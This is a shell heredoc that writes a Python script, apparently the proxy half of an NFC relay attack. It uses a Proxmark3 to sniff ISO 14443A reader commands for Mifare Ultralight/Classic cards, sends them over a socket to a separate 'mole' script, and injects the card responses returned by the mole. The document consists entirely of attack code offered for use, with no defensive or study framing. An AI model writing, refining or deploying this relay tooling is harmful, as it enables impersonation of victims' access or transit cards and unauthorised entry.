cat << 'EOF' > proxy3.py
import subprocess
import socket
import re
import string
import time

# --- CONFIGURATION ---
PM3_PATH = "./client/proxmark3.exe"
PORT_PM3 = "COM10"
MOLE_IP = "127.0.0.1" 
PORT_NET = 5555

def is_hex(s):
    hex_chars = string.hexdigits
    return all(c in hex_chars for c in s)

def pm3_exec(cmd):
    # Même fonction que dans mole.py
    return subprocess.run([PM3_PATH, PORT_PM3, "-c", cmd], capture_output=True, text=True).stdout

def start_proxy():
    pm3_exec("hf 14a sniff")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            print(f"[*] Connexion au Mole ({MOLE_IP}:{PORT_NET})...")
            s.connect((MOLE_IP, PORT_NET))
        except ConnectionRefusedError:
            print("[!] Erreur : lancez d'abord mole.py !")
            return

        # Nettoyage initial de l'historique
        #pm3_exec("hf 14a list -c")
        print("[*] Proxy prêt. Surveillance du lecteur en cours...")

        try:
            processed_lines = 0
            while True:
                # Récupération de l'historique
                res = pm3_exec("hf 14a list")
                lines = res.split('\n')
                
                if len(lines) > processed_lines:
                    for i in range(processed_lines, len(lines)):
                        line = lines[i]
                        
                        # Extraction de la trame du lecteur (Rdr)
                        match = re.search(r'Rdr\s+\|\s*([0-9A-Fa-f\s]+)', line)
                        if match:
                            cmd_clean = match.group(1).replace(" ", "").lower().strip()
                            
                            # Filtrage des commandes Mifare Ultralight / Classic
                            if any(cmd_clean.startswith(prefix) for prefix in ['1a', '30', 'a2']):
                                print(f"[Proxy >] Commande détectée : {cmd_clean}")
                                
                                # Envoi au Mole via socket
                                s.sendall(cmd_clean.encode()) 
                                
                                # Réception de la réponse de la carte
                                resp = s.recv(1024).decode()
                                
                                if resp and resp != "00" and is_hex(resp):
                                    print(f"[*] Injection de la réponse carte : {resp}")
                                    # Injection dans le champ RF (sans -q car absent de ta version)
                                    pm3_exec(f"hf 14a raw {resp}")
                    
                    processed_lines = len(lines)
                
                # Petite pause pour ne pas saturer le CPU
                time.sleep(0.05) 

        except KeyboardInterrupt:
            pm3_exec("hf 14a list")
            print("\n[*] Arrêt du Proxy.")
            

if __name__ == "__main__":
    start_proxy()
EOF